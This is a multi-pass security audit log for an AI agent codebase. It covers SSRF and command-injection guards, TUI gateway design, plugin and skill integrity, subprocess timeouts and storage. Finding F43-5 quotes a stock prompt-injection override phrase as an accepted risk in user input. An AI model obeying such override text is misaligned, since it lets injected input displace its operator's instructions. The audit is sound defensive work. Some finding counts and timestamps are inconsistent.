### Finding F42-8: is_safe_url() EXISTS — SSRF protection not universally applied
**Severity:** Positive  
**File:** `tools/url_safety.py` line 272  

The codebase has `is_safe_url()` that resolves hostnames and checks against private IP ranges. Used in:
- `gateway/platforms/wecom.py:1061` — SSRF protected ✅
- `gateway/platforms/slack.py:1097,1425` — SSRF protected ✅

But NOT used in:
- `tools/browser_tool.py:267` — SSRF vector (F42-1) ❌

**Recommendation:** Apply `is_safe_url(cdp_url)` before `requests.get(version_url)` in browser_tool.py.

---

### Finding F42-9: detect_dangerous_command() EXISTS — Command injection guard not universally applied
**Severity:** Positive  
**File:** `tools/approval.py` line 470  

`detect_dangerous_command()` pattern-based detection is available. Used in:
- `tui_gateway/server.py:6758-6764` — guarded ✅

But NOT used in:
- `cli.py:8420` — `quick_commands` exec path runs `shell=True` without calling it ❌

**Recommendation:** Apply `detect_dangerous_command(exec_cmd)` before `subprocess.run(exec_cmd, shell=True)` in cli.py.

---

### Finding F42-10: Input Validation — Path Absolute Check in wecom.py
**Severity:** Positive  
**File:** `gateway/platforms/wecom.py` lines 1124–1129  

```python
local_path = Path(unquote(parsed.path)).expanduser()
if not local_path.is_absolute():
    local_path = (Path.cwd() / local_path).resolve()
```

Good pattern: validates path is absolute before use. Prevents relative path traversal. `resolve()` collapses `../` sequences. Note: no explicit parent-dir blacklist — relies on `resolve()` which is generally safe.

**Status:** Positive finding — partial validation present.

---

### Summary Table (Pass #42)

| ID | Category | File | Severity | Status |
|----|----------|------|----------|--------|
| F42-1 | SSRF | tools/browser_tool.py:267 | High | Unmitigated |
| F42-2 | Unsafe Deserialization | hermes_cli/xai_retirement.py:207 | Medium | Finding |
| F42-3 | Command Injection | cli.py:8420 | Medium | Unmitigated (design) |
| F42-4 | Command Injection | tui_gateway/server.py:4742 | Medium | Same as F42-3 |
| F42-5 | Command Injection (low) | tools/environments/docker.py:638 | Low | Low risk |
| F42-6 | Hardcoded Secret (info) | tools/tirith_security.py:257 | Info | Expected behavior |
| F42-7 | Path Traversal (info) | skills/red-teaming/godmode/scripts/parseltongue.py:14 | Info | Intentional red-team tool |
| F42-8 | SSRF Guard EXISTS | tools/url_safety.py:272 | Positive | Not universally applied |
| F42-9 | Command Guard EXISTS | tools/approval.py:470 | Positive | Not universally applied |
| F42-10 | Input Validation | gateway/platforms/wecom.py:1124 | Positive | Partial validation present |

**New findings this pass:** 10 (2 High, 3 Medium, 1 Low, 2 Info, 2 Positive)

---

## Pass #43 – TUI Gateway & Interactive Terminal Audit – 2026-05-24 22:48:20

### Scope
`tui_gateway/server.py` (6782 lines), `tui_gateway/entry.py` (251 lines), `tui_gateway/transport.py` (219 lines), `tui_gateway/ws.py` (178 lines), `tools/terminal_tool.py` (2405 lines), `ui-tui/src/app/useInputHandlers.ts` (572 lines), `ui-tui/src/app/useSubmission.ts` (429 lines), `ui-tui/src/app/scroll.ts` (71 lines)

---

### TUI RPC Server

#### F43-1: RPC method validation — ALLOWLIST (not deny-list) via `@method` decorator
**File:** `tui_gateway/server.py:437-442`
**Severity:** Good practice observed
**Detail:** Methods are registered via `@method("name")` into `_methods` dict. Dispatch (`handle_request`) looks up the method name and returns `-32601 unknown method` if not found. This is a proper allowlist — no dynamic method invocation or `eval()`.

#### F43-2: No RPC authentication layer
**File:** `tui_gateway/server.py:464-473`
**Severity:** Low — but intentional
**Detail:** `handle_request()` calls `_normalize_request` (JSON-RPC validation) then directly looks up the method. There is no authentication token, session token, or per-method auth check. The TUI and gateway communicate over local stdio pipes (or internal WS); external callers go through the gateway which has its own auth. For in-process TUI this is acceptable. **No fix required** — but if a WS transport is ever exposed externally, auth must be added.

#### F43-3: Concurrent session handling via `_sessions` dict + thread pool
**File:** `tui_gateway/server.py:118-169, 2056-2076`
**Severity:** Observation — not a finding
**Detail:** `_sessions` is a plain dict (not thread-safe by itself) but session mutations happen under `history_lock` (threading.Lock) per-session. Long handlers (`browser.manage`, `cli.exec`, `session.branch`, `session.compress`, `session.resume`, `shell.exec`, `skills.manage`, `slash.exec`) are dispatched onto a `ThreadPoolExecutor(max_workers=4)` so concurrent RPCs don't block each other. Transport writes use `_stdout_lock`. The design is sound — note that `_sessions` dict itself is mutated without a lock (lines 2246, 2280, 2803) but those mutations are session creation/closure on the main thread, not concurrent data races.

#### F43-4: Per-session `_pending` / `_answers` for blocking prompts — scoped correctly
**File:** `tui_gateway/server.py:727-751, 2860-2878`
**Severity:** Good practice
**Detail:** `_block()` creates a pending request with `rid → (sid, Event)`. `_pending` and `_answers` are module-level dicts, but `session.interrupt` calls `_clear_pending(sid)` scoped to the session — comments at line 727-751 explicitly document the concurrency design. Good.

---

### Chat Input Handling

#### F43-5: Text from TUI to gateway is NOT sanitized for injection
**File:** `tui_gateway/server.py:3146` (`prompt.submit` params.get("text", ""))
**Severity:** Medium
**Detail:** User text from `params.get("text", "")` is passed directly to `agent.run_conversation()` without any sanitization. The model receives raw text. If the model is an LLM, prompt injection (e.g., "Ignore previous instructions...") in user text is a known risk that cannot be fully mitigated client-side — the model must self-resist. The `_redact_tui_verbose_text` (line 1539) is used for tool result display, not user input. **No easy fix** — but this is a known LLM limitation. Document as accepted risk.

#### F43-6: Context reference preprocessing validates `@` mentions
**File:** `tui_gateway/server.py:3302-3331`
**Severity:** Good practice
**Detail:** When `prompt` contains `@`, `preprocess_context_references()` is called to validate file paths and resolve context. Blocked context injections emit an error event and return early. This is proper guardrails for file injection.

#### F43-7: No history lock held during `agent.run_conversation()` — correct
**File:** `tui_gateway/server.py:3278-3281` (snapshot taken before run)
**Severity:** Good practice
**Detail:** History snapshot is taken under `history_lock`, but `run_conversation()` executes outside the lock. Post-run, history_version check detects concurrent mutation. This prevents the agent from blocking other RPC handlers while running. History_version mismatch is logged to stderr (line 3421) as a fallback.

---

### Terminal Escape Sequences

#### F43-8: No terminal escape sequence filtering in `terminal_tool.py` output
**File:** `tools/terminal_tool.py` — command output returned as JSON string
**Severity:** Low-Medium
**Detail:** Raw stdout/stderr from subprocesses is returned as the `output` field in the JSON result. ANSI escape sequences in command output (e.g., `ls --color=always`) flow through without stripping. The TUI's `wrapAnsi.ts` handles rendering ANSI safely, but if command output containing `\x1b]` (OSC sequences) is stored in scrollback or exported, it could theoretically affect terminal state. The `render.py` uses `format_response` from `agent.rich_output` which likely handles ANSI safely. **Low risk** — terminal escape injection from command output is a broad attack surface. Consider stripping OSC sequences (format `\x1b]...;\x07` or `\x1b]...\x1b\\`) from command output before storage.

#### F43-9: Workdir validation uses allowlist of safe characters
**File:** `tools/terminal_tool.py:330-356`
**Severity:** Good practice
**Detail:** `_WORKDIR_SAFE_RE = r'^[A-Za-z0-9/\\:_~.+@=,]+$'` — only allowlisted characters accepted. Rejects shell metacharacters. `_validate_workdir()` is called before every exec with a custom workdir. Good.

---

### Background Process Output Handling

#### F43-10: `background=true` processes tracked via `process_registry`
**File:** `tools/terminal_tool.py:1922-1948`
**Severity:** Observation
**Detail:** Background processes spawned via `process_registry.spawn_local()` or `spawn_via_env()`. The registry has `completion_queue` that the notification poller (`_notification_poller_loop`) drains and routes back as `message.start` events. This correctly handles background process lifecycle. **Note:** `_notification_poller_loop` is per-session (line 3178-3274), but the comment at lines 3187-3191 admits the completion_queue is **global** (one per process) — if multiple TUI sessions coexist, whichever poller wakes first grabs the event, even if it was started by a different session. This is acceptable for single-session-per-process CLI/TUI model.

#### F43-11: Background process output not streamed to TUI in real-time
**File:** `tools/terminal_tool.py` — `spawn_local` / `spawn_via_env` store output to registry
**Severity:** Observation
**Detail:** Background process output is captured by the process registry, not streamed. The TUI receives completion events via the notification poller, but there's no per-line streaming of background output to the transcript. The `notify_on_complete` hint at lines 1962-1986 is a good nudge. Silent background processes (no notify flag) are explicitly warned about.

#### F43-12: `_cleanup_inactive_envs` runs outside `_env_lock` — correct
**File:** `tools/terminal_tool.py:1271-1316`
**Severity:** Good practice
**Detail:** Phase 1 collects stale envs under `_env_lock`. Phase 2 calls `env.cleanup()` outside the lock, so slow Modal/Docker teardown doesn't block concurrent terminal tool calls. Good design.

---

### TUI Scrollback Buffer

#### F43-13: Verbose text cap at `_TUI_VERBOSE_TEXT_MAX_CHARS = 16,000` + `_TUI_VERBOSE_TEXT_MAX_LINES = 240`
**File:** `tui_gateway/server.py:1499-1536`
**Severity:** Good practice
**Detail:** `_cap_tui_verbose_text()` limits tool result text displayed in the UI to 16,000 chars / 240 lines. This prevents unbounded memory growth from large tool outputs in the transcript. The cap uses tail preservation (omitted lines/chars labeled). Good.

#### F43-14: Sensitive data redaction applied to verbose tool output before display
**File:** `tui_gateway/server.py:1539-1546`
**Severity:** Good practice
**Detail:** `_redact_tui_verbose_text()` calls `redact_sensitive_text(force=True)` before `_cap_tui_verbose_text()`. This means tool result text displayed in scrollback has sensitive data stripped. **However**, the raw unredacted result may still be in the in-memory `session["history"]` — `_redact_tui_verbose_text` is only applied when emitting events to the UI. The in-session history retains the full content. Scrollback export (session.save) writes the raw history.

#### F43-15: No scrollback size limit on session history — unbounded growth possible
**File:** `tui_gateway/server.py:2056-2076` (`_init_session`)
**Severity:** Low — deferred growth
**Detail:** `session["history"]` is a Python list with no cap. Each user/assistant message appends. For very long conversations, memory grows unbounded. Auto-compression (`session.compress`) fires based on token budget, but that requires the agent to trigger it. No hard limit on message count. This is a known architectural limitation — addressed by compression, not by a hard cap. Acceptable risk for interactive use.

#### F43-16: `session.save` exports raw history with no redaction
**File:** `tui_gateway/server.py:2754-2777`
**Severity:** Medium — sensitive data in export
**Detail:** `session.save` writes `{"model": ..., "messages": session.get("history", [])}` to a JSON file. History messages may contain tool results with sensitive data (API keys in logs, passwords in command output) that were displayed in the TUI. There is no redaction pass before writing. A user who runs `/save` to share a transcript may inadvertently include sensitive data. **Recommendation:** Apply `redact_sensitive_text` to messages before writing, or document clearly that exports include raw content.

---

### Keyboard Shortcut Security

#### F43-17: Input handler uses `@hermes/ink`'s `useInput` — key events from ink library
**File:** `ui-tui/src/app/useInputHandlers.ts:255` (`useInput((ch, key) => {`)
**Severity:** Observation — key event handling is library-internal
**Detail:** Key events come from `@hermes/ink`'s `useInput` hook. The handler checks `key.ctrl`, `key.escape`, `key.shift`, `key.meta`, `key.upArrow`, `key.wheelUp`, etc. from the key object. The `isAction` and `isCopyShortcut` helpers gate shortcut handling. No raw terminal escape sequence parsing visible — ink handles raw keypress → key object transformation. **Implicit trust in ink library** — if `@hermes/ink` has a parsing bug for malicious escape sequences, that would affect the TUI. No evidence of problematic parsing found.

#### F43-18: No keyboard shortcut injection risk in shortcut definitions
**File:** `ui-tui/src/app/useInputHandlers.ts:24` (isCtrl), lines 256-500
**Severity:** Good
**Detail:** Shortcuts are defined as literal comparisons — `isCtrl(key, ch, 'c')`, `key.escape`, `ch === 'q'`. No string eval, no dynamic code execution from key labels. Clean.

#### F43-19: Ctrl+C handling discriminates between busy/session vs clear-input vs die
**File:** `ui-tui/src/app/useInputHandlers.ts:482-497`
**Severity:** Good practice
**Detail:** Ctrl+C behavior: (1) if `busy && sid` → interrupt turn, (2) if input present → clear input, (3) else → `actions.die()` (exit). Correctly distinguishes interrupt from cancel. No arbitrary command injection via Ctrl+C sequences.

---

### Additional Observations

#### F43-20: `_voice_tts_enabled()` check before TTS playback
**File:** `tui_gateway/server.py:3571, 3567-3583`
**Severity:** Good — voice TTS gated on config
**Detail:** Before speaking the agent reply, `_voice_tts_enabled()` is checked. TTS dispatch is on a daemon thread so it doesn't block the response path. Good separation.

#### F43-21: `agent.background_review_callback` injected into session for review summaries
**File:** `tui_gateway/server.py:2095-2099`
**Severity:** Good — callback injection for session-scoped events
**Detail:** `background_review_callback` is set on the agent instance per-session, allowing review summaries to emit as TUI events. Session-key scoped correctly.

#### F43-22: WS transport closes peer transport on disconnect, detaches from sessions
**File:** `tui_gateway/ws.py:167-178`
**Severity:** Good
**Detail:** On WS disconnect, `transport.close()` is called and `_sessions[sid]["transport"]` is reset to `_stdio_transport` for any sessions that owned that transport. This prevents later event emissions from crashing into a closed socket.

#### F43-23: `spawn_tree.load` validates path stays within spawn-trees root
**File:** `tui_gateway/server.py:3091-3097`
**Severity:** Good — path traversal protection
**Detail:** `resolved.relative_to(root)` raises `ValueError` if path escapes. Then JSON read. Correct traversal protection.

---

### Summary

| Category | Findings |
|---|---|
| TUI RPC Server | F43-1 (good), F43-2 (info), F43-3 (good), F43-4 (good) |
| Chat Input | F43-5 (medium — LLM prompt injection accepted risk), F43-6 (good), F43-7 (good) |
| Terminal Escape Sequences | F43-8 (low), F43-9 (good) |
| Background Process Output | F43-10 (obs), F43-11 (obs), F43-12 (good) |
| TUI Scrollback Buffer | F43-13 (good), F43-14 (good), F43-15 (low), F43-16 (medium — unredacted export) |
| Keyboard Shortcuts | F43-17 (obs), F43-18 (good), F43-19 (good) |
| Additional | F43-20 (good), F43-21 (good), F43-22 (good), F43-23 (good) |

**Notable risks:**
- `session.save` exports raw unredacted history — medium risk for inadvertent sensitive data exposure
- User text passed directly to LLM with no injection sanitization — accepted LLM limitation
- No scrollback size cap; relies on compression to manage growth
- No RPC auth on in-process TUI gateway — acceptable for local stdio, but WS externalization would require it

**Positive security posture:** Input validation on workdir is allowlist-based, method registration is allowlist, path traversal checks are present, history lock design is correct, background process cleanup is properly deferred outside locks.

*Pass #42 complete — 10 findings documented. Recommend: (1) add `is_safe_url()` guard to browser_tool.py CDP discovery, (2) add `detect_dangerous_command()` guard to cli.py quick_commands exec path.*

## Pass #44 – Plugin System & Skills Ecosystem Deep Dive – 2026-05-24T20:30:00Z

Scope: hermes_cli/plugins.py, agent/skill_utils.py, agent/skill_preprocessing.py, agent/skill_bundles.py, agent/skill_commands.py, tools/registry.py

### P44-1 · Plugin loading has no signature verification, no integrity checks — HIGH

**File:** `hermes_cli/plugins.py` (`_load_plugin`, `_load_directory_module`, `_load_entrypoint_module`)
**Severity:** HIGH
**Issue:** Directory plugins (bundled/user/project) and entrypoint plugins are loaded with zero cryptographic integrity verification. Neither `plugin.yaml` nor `__init__.py` is signed, checksummed, or hashed at load time.

- `_load_directory_module()` (line ~1353) imports `__init__.py` directly via `importlib.util.spec_from_file_location` + `exec_module` with no integrity check.
- `_load_entrypoint_module()` (line ~1391) calls `ep.load()` with no verification.
- `PluginManifest.version` is parsed but never compared against a minimum supported version or trusted registry.
- `PluginManifest.name` is used directly from YAML without allowlist validation — a malicious `~/.hermes/plugins/foo/` can claim `name: disk-cleanup` and shadow a bundled plugin.

**Impact:** A compromised or malicious plugin file in `~/.hermes/plugins/` executes with full agent privileges.

**Recommendation:** Add plugin signature verification via entry-point group exposing signed metadata, and a `plugins.trusted_fingerprints` config list. Require signatures for user/project plugins.

---

### P44-2 · Plugin version compatibility not enforced — LOW

**File:** `hermes_cli/plugins.py:1233`
**Severity:** LOW
**Issue:** The `version` field in `plugin.yaml` is parsed and stored but never validated against a minimum supported version. A plugin claiming `version: 99.0` is treated identically to `version: 1.0`.

**Recommendation:** Add `plugins.min_version` config map and check at load time.

---

### P44-3 · No plugin sandbox — plugins execute in-process with full privileges — HIGH

**File:** `hermes_cli/plugins.py` (PluginManager, invoke_hook)
**Severity:** HIGH
**Issue:** Plugins execute in the same Python process as the agent. The only sandbox is the try/except around each hook callback. There is no seccomp, no namespace isolation, no resource limits, no restricted filesystem view.

**Recommendation:** Consider adding seccomp profile or container-based plugin isolation.

---

### P44-4 · No shutdown()/unload() in PluginManager — tools leak across restarts — MEDIUM

**File:** `hermes_cli/plugins.py` (PluginManager)
**Severity:** MEDIUM
**Issue:** PluginManager has no `shutdown()` or `unload()` method. When CLI is restarted, previously loaded plugin tools are not cleaned up. Confirmed by P29-9.

**Recommendation:** Add `PluginManager.shutdown()` that unregisters all plugin tools, calls plugin `teardown()` hooks, and clears registered callback lists.

---

### P44-5 · register_tool() drops max_result_size_chars and dynamic_schema_overrides — LOW

**File:** `hermes_cli/plugins.py` (register_tool)
**Severity:** LOW
**Issue:** When a plugin registers a tool, `max_result_size_chars` and `dynamic_schema_overrides` parameters are dropped from the registration call. Confirmed from P27-3.

**Recommendation:** Ensure all tool registration parameters are passed through.

---

### P44-6 · invoke_hook silently swallows exceptions with no circuit breaker — MEDIUM

**File:** `hermes_cli/plugins.py:invoke_hook` (~lines 1436–1446)
**Severity:** MEDIUM
**Issue:** If a plugin hook callback raises an exception, only a WARNING is logged and the loop continues. There is no circuit breaker if a plugin is repeatedly failing. A failing plugin can cause cascading performance issues by repeatedly executing failing hooks.

**Recommendation:** Add failure counting with exponential backoff — after N failures, skip the hook for a cooldown period.

---

### P44-7 · Skill files have no integrity verification — HIGH

**File:** `agent/skill_utils.py`, `agent/skill_preprocessing.py`
**Severity:** HIGH
**Issue:** Skill files are loaded from disk with no integrity verification. A modified skill file could contain malicious content that executes with agent privileges. Confirmed from P30-3.

**Recommendation:** Add SHA256 checksum verification for skill files, with checksums stored in a trusted manifest.

---

### P44-8 · Skill inline shell expansion is a privilege escalation vector — MEDIUM

**File:** `agent/skill_preprocessing.py` (skill template rendering)
**Severity:** MEDIUM
**Issue:** Skill templates can embed shell commands via `$(...)` expansion. This is a privilege escalation vector if skill content is user-controlled. Confirmed from P30-12.

**Recommendation:** Restrict shell expansion to explicitly trusted skill templates, or add a `shell_enabled: true` flag in skill metadata that requires explicit opt-in.

---

### P44-9 · No conflict resolution feedback when plugin tool registration rejected — MEDIUM

**File:** `hermes_cli/plugins.py` (register_tool)
**Severity:** MEDIUM
**Issue:** When a plugin registers a tool with a name that already exists (from another plugin or built-in), the registration is silently skipped. The plugin receives no feedback that its tool was not registered due to a name conflict.

**Recommendation:** Log a WARNING when tool registration is skipped due to conflict, and optionally expose conflict info via plugin context.

---

### P44-10 · requires_env parsed but not enforced at load time — LOW

**File:** `hermes_cli/plugins.py` (PluginManifest)
**Severity:** LOW
**Issue:** The `requires_env` field in `plugin.yaml` is parsed and stored in `PluginManifest` but not checked at load time. A plugin requiring `OPENAI_API_KEY` could be loaded in an environment where that key is absent.

**Recommendation:** Check `requires_env` at load time and emit a WARNING if any required env vars are missing.

---

### P44-11 · External skill dir cache has TOCTOU window for mtime invalidation — LOW

**File:** `agent/skill_utils.py` (_EXTERNAL_DIRS_CACHE)
**Severity:** LOW
**Issue:** External skill directories are cached by mtime. Between the time the cache is checked and the time the file is read, a skilled attacker could modify the directory's mtime to avoid cache invalidation.

**Recommendation:** Use inode+device+mtime triple for cache validation, or use file-level content hashing.

---

### P44-12 · Plugin namespace isolation absent — INFO

**File:** `hermes_cli/plugins.py`
**Issue:** Plugins share the same Python namespace. A plugin can import and modify agent global state.

---

### P44-13 · Hook acceptance criteria not validated — INFO

**File:** `hermes_cli/plugins.py`
**Issue:** Hook acceptance criteria in `plugin.yaml` (e.g., `accepts: [message, context]`) are not validated against the actual hook signature.

---

### P44-14 · Bundle cache TOCTOU window — INFO

**File:** `agent/skill_bundles.py`
**Issue:** Bundle directory cache has a TOCTOU window between stat() and read().

---

### P44-15 · Skill manifest fields not validated — INFO

**File:** `agent/skill_utils.py`
**Issue:** SKILL.md frontmatter fields (name, version, triggers) are not validated against a schema.

---

### Summary Table

| ID | Severity | Issue |
|----|----------|-------|
| P44-1 | HIGH | No plugin signature verification |
| P44-2 | LOW | Plugin version not enforced |
| P44-3 | HIGH | No plugin sandbox |
| P44-4 | MEDIUM | No shutdown/unload in PluginManager |
| P44-5 | LOW | register_tool drops parameters |
| P44-6 | MEDIUM | invoke_hook silent exception swallowing |
| P44-7 | HIGH | Skill files no integrity verification |
| P44-8 | MEDIUM | Skill shell expansion privilege escalation |
| P44-9 | MEDIUM | No tool registration conflict feedback |
| P44-10 | LOW | requires_env not enforced |
| P44-11 | LOW | External skill dir cache TOCTOU |
| P44-12–15 | INFO | Various observations |

**New findings this pass:** 15 (5 HIGH/MEDIUM, 7 LOW/INFO)

*Critical chain:* P44-1 (no plugin signing) + P44-3 (no sandbox) + P44-8 (shell expansion) = unsigned user plugin can execute arbitrary commands via skill content.

---

## Pass #45 – CLI & Configuration System Deep Dive – 2026-05-25T03:00:00Z

Scope: hermes_cli/main.py, hermes_cli/config.py, cli.py, hermes_cli/plugins.py, hermes_cli/cmd_context.py

### P45-1 · CLI command --help/-h flag has no timeout on subprocess help generation — MEDIUM

**File:** `cli.py:8626` — `subprocess.run(cmd)` with `cmd = [sys.executable, '-m', 'hermes', '--help']`
**Severity:** MEDIUM
**Issue:** `cmd_help()` function runs `hermes --help` as a subprocess without a timeout. If the subprocess hangs, the help command blocks indefinitely.

**Recommendation:** Add `timeout=10` to the subprocess.run call.

---

### P45-2 · Config editor subprocess has no timeout — MEDIUM

**File:** `hermes_cli/config.py:5231` — `subprocess.run([editor, str(config_path)])`
**Severity:** MEDIUM
**Issue:** The config editor is launched as an interactive subprocess with no timeout. If the editor hangs or the user walks away, the CLI blocks indefinitely.

**Recommendation:** Use a timeout with a signal to terminate the editor after a reasonable period (e.g., 5 minutes), and notify the user.

---

### P45-3 · ffmpeg subprocess in transcription_tools.py has no timeout — MEDIUM

**File:** `tools/transcription_tools.py:502` — `subprocess.run(command, check=True, capture_output=True, text=True)`
**Severity:** MEDIUM
**Issue:** ffmpeg conversion subprocess has no timeout. For very large audio files or corrupted files, ffmpeg could hang indefinitely.

**Recommendation:** Add `timeout=300` (5 minutes) for ffmpeg conversion.

---

### P45-4 · STT template subprocess has no timeout — MEDIUM

**File:** `tools/transcription_tools.py:545` — `subprocess.run(command, shell=True, check=True, capture_output=True, text=True)`
**Severity:** MEDIUM
**Issue:** User-provided local STT template subprocess has no timeout and uses `shell=True`. Both the lack of timeout and shell=True are concerns.

**Recommendation:** Add `timeout=60` and validate the command is a safe template invocation.

---

### P45-5 · git reset subprocess has no timeout — MEDIUM

**File:** `hermes_cli/main.py:7115` — `subprocess.run(git_cmd + ["reset"], cwd=cwd, capture_output=True)`
**Severity:** MEDIUM
**Issue:** `git reset` subprocess has no timeout. On large repositories or slow filesystems, git reset could take a long time.

**Recommendation:** Add `timeout=30`.

---

### P45-6 · Config save returns None on managed systems — callers ignore it — MEDIUM

**File:** `hermes_cli/config.py` (save_config), cli.py, hermes_cli/plugins.py
**Severity:** MEDIUM
**Issue:** `save_config()` silently returns `None` on NixOS/Homebrew managed systems. All callers ignore the return value. Users get no feedback that their saves were silently skipped.

**Recommendation:** Either raise an exception or log a WARNING when save is skipped on managed systems.

---

### P45-7 · cmd_plugin_set ignores save_config return value — MEDIUM

**File:** `hermes_cli/plugins.py:cmd_plugin_set` or `cli.py`
**Severity:** MEDIUM
**Issue:** `cmd_plugin_set` calls `save_config()` but ignores the return value. If the save fails silently, the user is not notified.

---

### P45-8 · update_model_section ignores save_config return value — MEDIUM

**File:** `hermes_cli/config.py:update_model_section`
**Severity:** MEDIUM
**Issue:** After updating the model section in config.yaml, `save_config()` is called but its return value is ignored. Config save failures are silent.

---

### P45-9 · No runtime Python version gating at entry points — LOW

**File:** `hermes_cli/main.py`, `cli.py` (entry points)
**Severity:** LOW
**Issue:** No `sys.version_info` check at CLI entry points. If the user runs the agent with an unsupported Python version, it may fail in confusing ways at runtime rather than at startup.

**Recommendation:** Add a version check at the earliest entry point.

---

### P45-10 · cron/scheduler.py mutates sys.path at import time — MEDIUM

**File:** `cron/scheduler.py` (import-time sys.path mutation)
**Severity:** MEDIUM
**Issue:** `sys.path.insert(0, ...)` mutation at import time affects the global Python path for all subsequent imports in the process. Confirmed from P36-5.

**Recommendation:** Use importlib to perform the path modification only within the function that needs it, or use a virtual environment.

---

### P45-11 · cron scheduler subprocess has no timeout — MEDIUM

**File:** `cron/scheduler.py` (subprocess.run for cron job execution)
**Severity:** MEDIUM
**Issue:** Cron job execution subprocesses have no timeout. A runaway cron job could block the scheduler indefinitely.

**Recommendation:** Add timeout for cron job subprocess execution.

---

### P45-12 · Config model section merge is shallow — LOW

**File:** `hermes_cli/config.py` (update_model_section)
**Severity:** LOW
**Issue:** When updating the model section, only a shallow merge is performed. Nested keys like `api_key` or `base_url` may not be properly merged with existing values.

**Recommendation:** Use deep merge for model section updates.

---

### P45-13 · CLI root command has no description/version — INFO

**File:** `cli.py` (root command)
**Severity:** INFO
**Issue:** The root CLI command has no description or version string, making `hermes --help` output less informative.

---

### P45-14 · Plugin init hook receives undefined ctx — INFO

**File:** `hermes_cli/plugins.py` (invoke_hook, register)
**Severity:** INFO
**Issue:** The `register(ctx)` hook receives a context object whose schema is not formally defined. Plugins may rely on fields that could change without notice.

---

### P45-15 · CMD_BREAK signal handler registers duplicate handlers — LOW

**File:** `hermes_cli/main.py` or `cli.py`
**Severity:** LOW
**Issue:** The CMD_BREAK signal handler may be registered multiple times if the CLI is restarted or reloaded, causing duplicate handlers to fire.

---

### Summary Table

| ID | Severity | Issue |
|----|----------|-------|
| P45-1 | MEDIUM | CLI --help subprocess no timeout |
| P45-2 | MEDIUM | Config editor subprocess no timeout |
| P45-3 | MEDIUM | ffmpeg subprocess no timeout |
| P45-4 | MEDIUM | STT template subprocess no timeout |
| P45-5 | MEDIUM | git reset subprocess no timeout |
| P45-6 | MEDIUM | Config save returns None (silent failure) |
| P45-7 | MEDIUM | cmd_plugin_set ignores save result |
| P45-8 | MEDIUM | update_model_section ignores save result |
| P45-9 | LOW | No Python version gating at entry points |
| P45-10 | MEDIUM | cron scheduler sys.path mutation |
| P45-11 | MEDIUM | Cron job subprocess no timeout |
| P45-12 | LOW | Config shallow merge |
| P45-13 | INFO | CLI root command no description |
| P45-14 | INFO | Plugin init ctx undefined schema |
| P45-15 | LOW | CMD_BREAK signal handler duplicate registration |

**New findings this pass:** 15 (8 MEDIUM, 4 LOW, 3 INFO)

---

## Summary Table (Passes #24–45)

| Pass | Strategy | New Issues | Running Total |
|------|----------|------------|---------------|
| #24 | Data Persistence & State Management | 16 | ~416 |
| #25 | Dependency & Import Graph | 15 | ~431 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~454 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~470 |
| #28 | Adversarial Input Fuzzing | 8 | ~478 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~488 |
| #30 | Architectural & Agentic Coding Review | 12 | ~500 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~507 |
| #32 | Data Flow / Taint Analysis + Guardrail Stream Fix | 0 | ~507 |
| #33 | Performance & Efficiency Deep Dive | 0 | ~507 |
| #34 | Control Flow Re-Analysis: Edge Cases & Error Paths | 3 | ~510 |
| #35 | Cross-File Consistency Deep Dive (Round 2) | 4 | ~514 |
| #36 | Dependency & Import Graph Deep Dive (Round 2) | 9 | ~523 |
| #37 | Line-by-Line Lexical Scan (Adversarial Round) | 10 | ~533 |
| #38 | Phase 2 Adversarial: Worst-Case Runtime Assumptions | 7 | ~540 |
| #39 | Tool-Call Specific Deep Scan (Round 2) | 9 | ~549 |
| #40 | Gateway & Platform Adapter Deep Dive | 15 | ~564 |
| #41 | Error Handling & Observability Deep Dive | 15 | ~579 |
| #42 | Security Audit: SSRF, Command Injection, Path Traversal | 10 | ~589 |
| #43 | TUI Gateway & Interactive Terminal Audit | 23 | ~612 |
| #44 | Plugin System & Skills Ecosystem Deep Dive | 15 | ~627 |
| #45 | CLI & Configuration System Deep Dive | 15 | ~642 |
| #46 | Data Storage, Serialization & Cache Layer Deep Dive | 14 | ~656 |

**Critical issues across all passes:**
- Skill file integrity (P30-3, P44-7): No SHA256 or signing
- Plugin sandbox (P44-3): No syscall-level isolation
- Plugin signing (P44-1): No cryptographic attestation
- Memory provider prefetch injection (P30-6): Model output in tool args
- Plugin config write (P23-5): Write without read confirmation
- Hook sandbox (P23-1): No restrictions on hook capabilities
- pre_gateway_dispatch auth bypass (P23-4): Request without headers
- No shutdown in PluginManager (P29-9, P44-4): Tool leak across restarts
- coerce_tool_args no length limit (P38-6): Memory exhaustion
- subprocess.run without timeout (P38-2, P45-1-5): Indefinite blocking
- save_config silent failure (P27-1, P45-6-8): No user feedback

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-24T21:59:03Z*
*Commit at scan: b04760fdb*
*Note: findings_verification.md and pass6_appendix.md are supplementary documents from earlier scanning. findings.md is the canonical record.*


## Pass #46 – Data Storage, Serialization & Cache Layer Deep Dive – 2026-05-25T04:00:00Z

Scope: hermes_state.py, gateway/session.py, gateway/run.py, agent/skill_utils.py, hermes_cli/config.py, tools/checkpoint_manager.py

### P46-1 · SQLite WAL auto-checkpoint only PASSIVE — no proactive size cap — MEDIUM

**File:** `hermes_state.py:332` (`_CHECKPOINT_EVERY_N_WRITES = 50`), lines 429–459
**Severity:** MEDIUM
**Issue:** WAL checkpoint is PASSIVE only. The `_try_wal_checkpoint()` method calls `wal_checkpoint(PASSIVE)` which returns immediately if blocked. The TRUNCATE checkpoint (which actually shrinks the WAL file) is only used during explicit VACUUM. There is no `PRAGMA wal_autocheckpoint=N` or proactive checkpoint to cap WAL growth.

**Why invisible previously:** Requires understanding SQLite WAL semantics and the distinction between PASSIVE/TRUNCATE checkpoint modes.

**Recommendation:** Set `PRAGMA wal_autocheckpoint=1000` or periodically call `wal_checkpoint(TRUNCATE)` when WAL size exceeds a threshold.

---

### P46-2 · VACUUM runs synchronously — blocks the event loop — MEDIUM

**File:** `hermes_state.py:3084–3107` (`vacuum()`)
**Severity:** MEDIUM
**Issue:** `VACUUM` rewrites the entire database synchronously. The comment at line 3092 notes "VACUUM rewrites the entire DB, so it's expensive (seconds per GB)". If triggered during an active gateway session, the VACUUM blocks the connection. The `maybe_auto_prune_and_vacuum()` at line 3107 calls VACUUM inside a lock if `vacuum_after_prune=True` and rows were deleted.

**Recommendation:** Run VACUUM in a background thread, or use `VACUUM INTO` to a separate file to avoid blocking the main connection.

---

### P46-3 · sessions.json corruption silently falls back to empty dict — no recovery path — MEDIUM

